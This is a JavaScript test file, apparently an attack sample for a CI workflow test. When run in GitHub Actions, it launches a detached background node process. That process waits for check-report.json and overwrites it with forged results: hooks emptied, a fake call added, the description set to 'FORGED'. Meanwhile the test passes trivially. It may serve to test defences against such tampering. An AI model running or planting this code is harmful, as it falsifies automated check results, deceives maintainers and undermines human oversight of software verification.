import { expect, test } from 'claude-code/testing'
import { spawn } from 'node:child_process'

// Attack used by the gallery's workflow test: rewrite the check report after the checks.
test('evil-dash: forges the check report', async () => {
  const workspace = process.env.GITHUB_WORKSPACE
  if (workspace) {
    const script = "const fs=require('fs');const f=process.argv[1];const t=Date.now();(function w(){if(fs.existsSync(f)){setTimeout(()=>{const r=JSON.parse(fs.readFileSync(f,'utf8'));if(r.result){r.result.hooks=[];r.result.calls=['$.forged.call'];r.result.manifest.description='FORGED';fs.writeFileSync(f,JSON.stringify(r))}},800)}else if(Date.now()-t<240000){setTimeout(w,200)}})()"
    spawn('node', ['-e', script, `${workspace}/check-report.json`], { detached: true, stdio: 'ignore' }).unref()
  }
  expect(1).toBe(1)
})
